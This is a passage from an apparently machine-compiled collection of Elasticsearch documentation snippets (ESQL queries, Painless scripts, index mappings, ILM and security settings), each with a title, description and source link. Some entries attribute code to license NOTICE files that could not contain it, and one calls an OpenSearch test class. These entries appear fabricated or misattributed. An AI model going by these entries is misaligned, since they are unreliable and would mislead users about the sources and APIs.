}\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Scaling Thread Pool in Elasticsearch\nDESCRIPTION: Configuration example for a scaling thread pool type with core size, max size, and keep alive parameters\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/thread-pool-settings.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nthread_pool:\n    warmer:\n        core: 1\n        max: 8\n        keep_alive: 2m\n```\n\n----------------------------------------\n\nTITLE: ILM Allocate Action with Custom Node Attribute Assignment\nDESCRIPTION: Demonstrates allocating an index to nodes based on a custom box_type attribute, targeting nodes marked as either hot or warm.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-allocate.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"warm\": {\n        \"actions\": {\n          \"allocate\" : {\n            \"include\" : {\n              \"box_type\": \"hot,warm\"\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Scoring Documents with Float Rank Vectors in Elasticsearch\nDESCRIPTION: Example demonstrating how to use script_score queries with rank vectors to score documents based on maxSim similarity between query vectors and stored vectors using the dot product function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/rank-vectors.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET my-rank-vectors-float/_search\n{\n  \"query\": {\n    \"script_score\": {\n      \"query\": {\n        \"match_all\": {}\n      },\n      \"script\": {\n        \"source\": \"maxSimDotProduct(params.query_vector, 'my_vector')\",\n        \"params\": {\n          \"query_vector\": [[0.5, 10, 6], [-0.5, 10, 10]]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Elasticsearch Search Query in Java\nDESCRIPTION: This code snippet shows how to execute a search query in Elasticsearch using the Java client. It builds a search request, executes it, and retrieves the response. The search query includes a match query for the 'user' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/inference/licenses/reactive-streams-NOTICE.txt#2025-04-22_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\nSearchRequest searchRequest = new SearchRequest(\"posts\");\nSearchSourceBuilder searchSourceBuilder = new SearchSourceBuilder();\nsearchSourceBuilder.query(QueryBuilders.matchQuery(\"user\", \"kimchy\"));\nsearchRequest.source(searchSourceBuilder);\n\nSearchResponse searchResponse = client.search(searchRequest, RequestOptions.DEFAULT);\n```\n\n----------------------------------------\n\nTITLE: JSON Parsing Example in Painless\nDESCRIPTION: This code snippet shows how to use the JSON processor to parse a JSON string and add the resulting structured object to the document context.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-ingest-processors-in-painless.md#2025-04-21_snippet_5\n\nLANGUAGE: painless\nCODE:\n```\nObject json = Processors.json(ctx.inputJsonString);\nctx.structuredJson = json;\n```\n\n----------------------------------------\n\nTITLE: Configuring Secure Key Passphrase for Remote Cluster Client SSL in Elasticsearch\nDESCRIPTION: Secure setting for the passphrase used to decrypt the private key for remote cluster client SSL. Optional as the key might not be encrypted.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_44\n\nLANGUAGE: properties\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.secure_key_passphrase\n```\n\n----------------------------------------\n\nTITLE: Ingesting Documents with ML Pipeline in Elasticsearch\nDESCRIPTION: API call to index a document with a language identification pipeline. The document contains text in English, and the pipeline will detect and add the language information to the indexed document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-api-services-storage-NOTICE.txt#2025-04-21_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nPUT my_index/_doc/1?pipeline=lang_ident_pipeline\n{\n  \"text\": \"The quick brown fox jumps over the lazy dog.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Percolator Field Mapping in Elasticsearch\nDESCRIPTION: Shows how to set up an index mapping with a percolator field type for storing queries and a text field for matching.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/percolator.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"query\": {\n        \"type\": \"percolator\"\n      },\n      \"field\": {\n        \"type\": \"text\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Def Type Compound Assignment\nDESCRIPTION: Example of compound assignment using the def type with implicit casting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-general.md#2025-04-21_snippet_9\n\nLANGUAGE: painless\nCODE:\n```\ndef x = 1;\nx += 2;\n```\n\n----------------------------------------\n\nTITLE: Defining Function Parameters in Elasticsearch ESQL\nDESCRIPTION: This snippet defines the parameters for a geospatial function in Elasticsearch's ESQL. It specifies the input types and behavior for null inputs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/st_ymax.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`point`\n:   Expression of type `geo_point`, `geo_shape`, `cartesian_point` or `cartesian_shape`. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Detailed config.yml Example\nDESCRIPTION: This YAML snippet provides a detailed example of a `config.yml` file used for configuring Elasticsearch connectors. It includes the Elasticsearch API key at the top level and demonstrates configuring multiple connectors with specific API keys or defaulting to the top-level key if not specified individually.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-run-from-source.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n\"elasticsearch:\n  api_key: <key1> # Used to write data to .elastic-connectors and .elastic-connectors-sync-jobs\n                # Any connectors without a specific `api_key` value will default to using this key\nconnectors:\n  - connector_id: 1234\n    api_key: <key2> # Used to write data to the `search-*` index associated with connector 1234\n                    # You may have multiple connectors in your config file!\n  - connector_id: 5678\n    api_key: <key3> # Used to write data to the `search-*` index associated with connector 5678\n  - connector_id: abcd # No explicit api key specified, so this connector will use <key1>\"\n```\n\n----------------------------------------\n\nTITLE: Title Search with MULTI_MATCH and AND Operator in ESQL\nDESCRIPTION: Query searching for 'Hobbit Back Again' across title and description fields using AND operator, returning only the title field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/multi_match.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM books\n| WHERE MULTI_MATCH(\"Hobbit Back Again\", title, description, {\"operator\": \"AND\"})\n| KEEP title;\n```\n\n----------------------------------------\n\nTITLE: Fetch Profile Result in Elasticsearch (Console Result)\nDESCRIPTION: Shows the detailed fetch profile output from Elasticsearch, including timing breakdowns for various fetch operations and debug information about stored fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_12\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"profile\": {\n    \"shards\": [\n      {\n        \"fetch\": {\n          \"type\": \"fetch\",\n          \"description\": \"\",\n          \"time_in_nanos\": 660555,\n          \"breakdown\": {\n            \"next_reader\": 7292,\n            \"next_reader_count\": 1,\n            \"load_stored_fields\": 299325,\n            \"load_stored_fields_count\": 5,\n            \"load_source\": 3863,\n            \"load_source_count\": 5\n          },\n          \"debug\": {\n            \"stored_fields\": [\"_id\", \"_routing\", \"_source\"]\n          },\n          \"children\": [\n            {\n              \"type\" : \"FetchFieldsPhase\",\n              \"description\" : \"\",\n              \"time_in_nanos\" : 238762,\n              \"breakdown\" : {\n                \"process_count\" : 5,\n                \"process\" : 227914,\n                \"next_reader\" : 10848,\n                \"next_reader_count\" : 1\n              }\n            },\n            {\n              \"type\": \"FetchSourcePhase\",\n              \"description\": \"\",\n              \"time_in_nanos\": 20443,\n              \"breakdown\": {\n                \"next_reader\": 745,\n                \"next_reader_count\": 1,\n                \"process\": 19698,\n                \"process_count\": 5\n              },\n              \"debug\": {\n                \"fast_path\": 4\n              }\n            },\n            {\n              \"type\": \"StoredFieldsPhase\",\n              \"description\": \"\",\n              \"time_in_nanos\": 5310,\n              \"breakdown\": {\n                \"next_reader\": 745,\n                \"next_reader_count\": 1,\n                \"process\": 4445,\n                \"process_count\": 5\n              }\n            }\n          ]\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Split Processor with Whitespace Separator in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure the Split processor to split a field using whitespace as a separator. It uses a regular expression '\\s+' to match one or more whitespace characters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/split-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"split\": {\n    \"field\": \"my_field\",\n    \"separator\": \"\\\\s+\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Analyzer with Word Delimiter Graph Filter in Elasticsearch\nDESCRIPTION: This snippet illustrates how to add the word_delimiter_graph filter to a custom analyzer during index creation using the create index API. It configures the analyzer to use the keyword tokenizer and the word delimiter graph filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-word-delimiter-graph-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"keyword\",\n          \"filter\": [ \"word_delimiter_graph\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Fetching a Specific Hockey Player by ID\nDESCRIPTION: Search query to retrieve the source data for a hockey player with ID 1.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/brief-painless-walkthrough.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET hockey/_search\n{\n  \"query\": {\n    \"term\": {\n      \"_id\": 1\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining EQUALS (==) Operator in ESQL\nDESCRIPTION: The EQUALS (==) operator checks if two fields are equal. It returns null for multivalued fields and can be optimized for search index queries under certain conditions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/operators/equals.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n### EQUALS `==`\nCheck if two fields are equal. If either field is [multivalued](https://www.elastic.co/docs/reference/query-languages/esql/esql-multivalued-fields) then the result is `null`.\n\nNote: This is pushed to the underlying search index if one side of the comparison is constant and the other side is a field in the index that has both an [mapping-index](https://www.elastic.co/docs/reference/elasticsearch/mapping-reference/mapping-index) and [doc-values](https://www.elastic.co/docs/reference/elasticsearch/mapping-reference/doc-values).\n```\n\n----------------------------------------\n\nTITLE: Highlighting Example with Pattern Replace\nDESCRIPTION: Example showing how pattern replacement affects highlighting in search results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-replace-charfilter.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1?refresh\n{\n  \"text\": \"The fooBarBaz method\"\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"match\": {\n      \"text\": \"bar\"\n    }\n  },\n  \"highlight\": {\n    \"fields\": {\n      \"text\": {}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Document Indexing with Custom Routing in Elasticsearch\nDESCRIPTION: Example of indexing a document with a custom routing value that determines which shard the document is stored on. Includes timestamp and user data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-shard-routing.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /my-index-000001/_doc?routing=my-routing-value\n{\n  \"@timestamp\": \"2099-11-15T13:12:00\",\n  \"message\": \"GET /search HTTP/1.1 200 1070000\",\n  \"user\": {\n    \"id\": \"kimchy\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Documents with Immediate Refresh in Elasticsearch\nDESCRIPTION: Examples of creating documents with immediate refresh by using refresh=true or just refresh parameter. This makes the documents immediately visible in search results but should be used cautiously due to performance implications.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/refresh-parameter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /test/_doc/1?refresh\n{\"test\": \"test\"}\nPUT /test/_doc/2?refresh=true\n{\"test\": \"test\"}\n```\n\n----------------------------------------\n\nTITLE: Wildcard Queries in YAML\nDESCRIPTION: This snippet demonstrates the usage of wildcard searches in KQL, allowing for pattern matching within fields. It includes an explanation of the default restriction on leading wildcards and the relevant advanced setting for changes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/kql.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nhttp.response.status_code: 4*\n```\n\n----------------------------------------\n\nTITLE: Reset Native User Password - Interactive Mode\nDESCRIPTION: Example demonstrating how to reset a native user's password in interactive mode where the user is prompted to enter the new password.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/reset-password.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-reset-password --username user1 -i\n```\n\n----------------------------------------\n\nTITLE: Monthly Hire Count Histogram in ESQL\nDESCRIPTION: Creates a histogram showing hire counts per month using the BUCKET function combined with COUNT aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/bucket.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE hire_date >= \"1985-01-01T00:00:00Z\" AND hire_date < \"1986-01-01T00:00:00Z\"\n| STATS hires_per_month = COUNT(*) BY month = BUCKET(hire_date, 20, \"1985-01-01T00:00:00Z\", \"1986-01-01T00:00:00Z\")\n| SORT month\n```\n\n----------------------------------------\n\nTITLE: Indexing a Document Using Date Index Name Pipeline in Elasticsearch\nDESCRIPTION: Example of indexing a document through the date index name pipeline, which will redirect it to a time-based index calculated from the document's date field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/date-index-name-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index/_doc/1?pipeline=monthlyindex\n{\n  \"date1\" : \"2016-04-25T12:02:01.789Z\"\n}\n```\n\n----------------------------------------\n\nTITLE: SAML Message Signing Configuration Example\nDESCRIPTION: Example of signing configuration settings for SAML messages in Elasticsearch. Shows supported message types that can be signed including AuthnRequest, LogoutRequest and LogoutResponse.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nsigning.saml_messages: [\"AuthnRequest\", \"LogoutRequest\", \"LogoutResponse\"]\n```\n\n----------------------------------------\n\nTITLE: Pinning Documents in a Specific Index - Elasticsearch Console\nDESCRIPTION: This example shows how to pin documents using their specific index and ID. It illustrates how to ensure certain documents appear first in search results by specifying each document's index and ID. Useful when working with multiple indices in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-pinned-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"pinned\": {\n      \"docs\": [\n        {\n          \"_index\": \"my-index-000001\", <1>\n          \"_id\": \"1\"\n        },\n        {\n          \"_id\": \"4\" <2>\n        }\n      ],\n      \"organic\": {\n        \"match\": {\n          \"description\": \"iphone\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring GraphQL Variables in JSON\nDESCRIPTION: This JSON object example shows how to define variables for a GraphQL query, which can be used in the connector's configuration to substitute values in the query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-graphql.md#2025-04-21_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\n{\"id\": \"123\"}\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Types Table in Markdown\nDESCRIPTION: A markdown table showing the mapping between field types and their corresponding result types for ESQL's AbstractFunctionTestCase. This table is automatically generated and includes various data types such as boolean, date, numeric types, and special types like IP and version.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/mv_min.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| boolean | boolean |\n| date | date |\n| date_nanos | date_nanos |\n| double | double |\n| integer | integer |\n| ip | ip |\n| keyword | keyword |\n| long | long |\n| text | keyword |\n| unsigned_long | unsigned_long |\n| version | version |\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Parameter Definition - Number\nDESCRIPTION: Parameter definition block for a number parameter in an ESQL function test case. This is an auto-generated documentation block that should not be edited manually.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/median_absolute_deviation.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`number`\n:   \n```\n\n----------------------------------------\n\nTITLE: Response from Children Aggregation Query in Elasticsearch\nDESCRIPTION: This snippet shows the response structure from a Children aggregation query, including top tags, answer counts, and top answer owners for each tag.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-children-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 25,\n  \"timed_out\": false,\n  \"_shards\": {\n    \"total\": 1,\n    \"successful\": 1,\n    \"skipped\" : 0,\n    \"failed\": 0\n  },\n  \"hits\": {\n    \"total\" : {\n      \"value\": 3,\n      \"relation\": \"eq\"\n    },\n    \"max_score\": null,\n    \"hits\": []\n  },\n  \"aggregations\": {\n    \"top-tags\": {\n      \"doc_count_error_upper_bound\": 0,\n      \"sum_other_doc_count\": 0,\n      \"buckets\": [\n        {\n          \"key\": \"file-transfer\",\n          \"doc_count\": 1,\n          \"to-answers\": {\n            \"doc_count\": 2,\n            \"top-names\": {\n              \"doc_count_error_upper_bound\": 0,\n              \"sum_other_doc_count\": 0,\n              \"buckets\": [\n                {\n                  \"key\": \"Sam\",\n                  \"doc_count\": 1\n                },\n                {\n                  \"key\": \"Troll\",\n                  \"doc_count\": 1\n                }\n              ]\n            }\n          }\n        },\n        {\n          \"key\": \"windows-server-2003\",\n          \"doc_count\": 1,\n          \"to-answers\": {\n            \"doc_count\": 2,\n            \"top-names\": {\n              \"doc_count_error_upper_bound\": 0,\n              \"sum_other_doc_count\": 0,\n              \"buckets\": [\n                {\n                  \"key\": \"Sam\",\n                  \"doc_count\": 1\n                },\n                {\n                  \"key\": \"Troll\",\n                  \"doc_count\": 1\n                }\n              ]\n            }\n          }\n        },\n        {\n          \"key\": \"windows-server-2008\",\n          \"doc_count\": 1,\n          \"to-answers\": {\n            \"doc_count\": 2,\n            \"top-names\": {\n              \"doc_count_error_upper_bound\": 0,\n              \"sum_other_doc_count\": 0,\n              \"buckets\": [\n                {\n                  \"key\": \"Sam\",\n                  \"doc_count\": 1\n                },\n                {\n                  \"key\": \"Troll\",\n                  \"doc_count\": 1\n                }\n              ]\n            }\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Angle with ATAN2 Function in ESQL\nDESCRIPTION: This snippet demonstrates how to use the ATAN2 function in ESQL to calculate the angle between the positive x-axis and a point in the Cartesian plane. It creates a row with y and x values, then applies the ATAN2 function to compute the angle in radians.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/atan2.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW y=12.9, x=.6\n| EVAL atan2=ATAN2(y, x)\n```\n\n----------------------------------------\n\nTITLE: Updating Elasticsearch Deployment and Bundle Reference in JSON\nDESCRIPTION: This JSON snippet demonstrates how to update an Elasticsearch deployment plan to upgrade the Elasticsearch version and update the bundle reference. It includes setting the new Elasticsearch version and updating the user bundle's Elasticsearch version compatibility.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_17\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"name\": \"Extensions\",\n    \"prune_orphans\": false,\n    \"resources\": {\n        \"elasticsearch\": [\n            {\n                \"region\": \"gcp-us-central1\",\n                \"ref_id\": \"main-elasticsearch\",\n                \"plan\": {\n                    \"cluster_topology\": [\n                      ...\n                    ],\n                    \"elasticsearch\": {\n                        \"version\": \"8.4.3\",\n                        \"enabled_built_in_plugins\": [],\n                        \"user_bundles\": [\n                            {\n                                  \"elasticsearch_version\": \"7.*\",\n                                  \"name\": \"custom-bundle\",\n                                  \"url\": \"repo://5886113212\"\n                            }\n                        ]\n\n                    },\n                    \"deployment_template\": {\n                        \"id\": \"gcp-storage-optimized-v3\"\n                    }\n                }\n            }\n        ]\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring SMB NIO File System Globally in Elasticsearch\nDESCRIPTION: Sets the default storage type to SMB NIO file system for all newly created indices by adding a configuration to the elasticsearch.yml file. This helps work around performance issues with SMB shared file systems on Windows.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/store-smb-usage.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nindex.store.type: smb_nio_fs\n```\n\n----------------------------------------\n\nTITLE: Converting WKT Format to Geo Point in ESQL\nDESCRIPTION: This example demonstrates how to use the TO_GEOPOINT function to convert a WKT (Well-Known Text) string representation of a point to Elasticsearch's geo_point data type. The function takes a WKT string as input and returns a geo_point value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_geopoint.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW wkt = \"POINT(42.97109630194 14.7552534413725)\"\n| EVAL pt = TO_GEOPOINT(wkt)\n```\n\n----------------------------------------\n\nTITLE: Cloud Service Metric Paths Definition\nDESCRIPTION: Defines the metric paths and configurations for monitoring various AWS and Azure cloud services. Includes paths for Lambda functions, networking components, storage services, database metrics, and application monitoring.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/test/framework/src/main/resources/org/elasticsearch/common/xcontent/support/many_filters.txt#2025-04-22_snippet_1\n\nLANGUAGE: plaintext\nCODE:\n```\naws.lambda.metrics.IteratorAge.avg\naws.lambda.metrics.ProvisionedConcurrencyInvocations.sum\naws.lambda.metrics.ProvisionedConcurrencySpilloverInvocations.sum\naws.lambda.metrics.ProvisionedConcurrencyUtilization.max\naws.lambda.metrics.ProvisionedConcurrentExecutions.max\naws.lambda.metrics.Throttles.avg\naws.lambda.metrics.UnreservedConcurrentExecutions.avg\n```\n\n----------------------------------------\n\nTITLE: Mathematical Functions in Elasticsearch SQL\nDESCRIPTION: A collection of mathematical and trigonometric functions available in Elasticsearch SQL. These functions provide various numerical operations and calculations, including absolute values, logarithms, and trigonometric computations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/qa/server/single-node/src/javaRestTest/resources/org/elasticsearch/xpack/sql/qa/single_node/ConsistentFunctionArgHandlingIT-non-tested-functions.txt#2025-04-21_snippet_1\n\nLANGUAGE: SQL\nCODE:\n```\nABS\nACOS\nASIN\nATAN\nATAN2\nCBRT\nCEIL\nCEILING\nCOS\nCOSH\nCOT\nDEGREES\nE\nEXP\nEXPM1\nFLOOR\nLOG\nLOG10\nMOD\nPI\nPOWER\nRADIANS\nRAND\nRANDOM\nROUND\nSIGN\nSIGNUM\nSIN\nSINH\nSQRT\nTAN\nTRUNC\nTRUNCATE\n```\n\n----------------------------------------\n\nTITLE: Creating Wildcard Field Mapping for IP Address Extraction\nDESCRIPTION: This snippet demonstrates how to create an index with a wildcard mapping for a message field that contains Apache log data including IP addresses.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_14\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001/\n{\n  \"mappings\": {\n    \"properties\": {\n      \"message\": {\n        \"type\": \"wildcard\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining NumberSortScript Factory Class for Painless\nDESCRIPTION: This code snippet defines a factory class 'NumberSortScript$Factory' designed to create instances of the 'NumberSortScript'. Like the previous class, it is also whitelisted for use with the field API in Painless scripting without importing any dependencies. This structure supports the instantiation logic necessary for the field API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.number_sort.txt#2025-04-21_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\nclass org.elasticsearch.script.NumberSortScript$Factory @no_import {\n}\n```\n\n----------------------------------------\n\nTITLE: Input Document with Conflicting Field Types\nDESCRIPTION: Shows an example document where a scalar field conflicts with a dotted field that would need that scalar to become an object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dot-expand-processor.md#2025-04-21_snippet_13\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"foo\": \"value1\",\n  \"foo.bar\": \"value2\"\n}\n```\n\n----------------------------------------\n\nTITLE: SQL LIKE Pattern with Escape Character in Elasticsearch\nDESCRIPTION: Demonstrates using ESCAPE clause with LIKE pattern to match literal percentage characters in table names.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-index-patterns.md#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nSHOW TABLES LIKE 'emp!%' ESCAPE '!';\n```\n\n----------------------------------------\n\nTITLE: Hot Threads API Output for Idle Transport Worker\nDESCRIPTION: Example output from the Nodes hot threads API showing an idle transport_worker thread, including CPU usage statistics and stack trace information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_19\n\nLANGUAGE: text\nCODE:\n```\n   0.0% [cpu=0.0%, idle=100.0%] (500ms out of 500ms) cpu usage by thread 'elasticsearch[instance-0000000004][transport_worker][T#1]'\n     10/10 snapshots sharing following 9 elements\n       java.base@17.0.2/sun.nio.ch.EPoll.wait(Native Method)\n       java.base@17.0.2/sun.nio.ch.EPollSelectorImpl.doSelect(EPollSelectorImpl.java:118)\n       java.base@17.0.2/sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:129)\n       java.base@17.0.2/sun.nio.ch.SelectorImpl.select(SelectorImpl.java:146)\n       io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:813)\n       io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:460)\n       io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:986)\n       io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)\n       java.base@17.0.2/java.lang.Thread.run(Thread.java:833)\n```\n\n----------------------------------------\n\nTITLE: Min Aggregation on Histogram Fields in Elasticsearch\nDESCRIPTION: This example demonstrates how to use Min aggregation on histogram fields, including index creation, document insertion, and aggregation query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-min-aggregation.md#2025-04-22_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT metrics_index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"latency_histo\": { \"type\": \"histogram\" }\n    }\n  }\n}\n\nPUT metrics_index/_doc/1?refresh\n{\n  \"network.name\" : \"net-1\",\n  \"latency_histo\" : {\n      \"values\" : [0.1, 0.2, 0.3, 0.4, 0.5],\n      \"counts\" : [3, 7, 23, 12, 6]\n   }\n}\n\nPUT metrics_index/_doc/2?refresh\n{\n  \"network.name\" : \"net-2\",\n  \"latency_histo\" : {\n      \"values\" :  [0.1, 0.2, 0.3, 0.4, 0.5],\n      \"counts\" : [8, 17, 8, 7, 6]\n   }\n}\n\nPOST /metrics_index/_search?size=0&filter_path=aggregations\n{\n  \"aggs\" : {\n    \"min_latency\" : { \"min\" : { \"field\" : \"latency_histo\" } }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating Random Longitude for Elasticsearch Geo Testing in Java\nDESCRIPTION: This method creates a random longitude value for geospatial testing. It ensures the generated value is within the valid range of -180 to 180 degrees.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/esql/arrow/licenses/checker-qual-NOTICE.txt#2025-04-22_snippet_3\n\nLANGUAGE: Java\nCODE:\n```\npublic static double randomLongitude() {\n    return OpenSearchTestCase.randomDouble() * 360 - 180;\n}\n```\n\n----------------------------------------\n\nTITLE: Pivoting with AVG on Gender with Subquery\nDESCRIPTION: This code snippet shows how to pivot data using the `AVG` function on the `gender` column. It selects `languages`, `gender`, and `salary` from a subquery before applying the pivot operation. The aggregate values represent the average salary by gender.\nSOURCE: 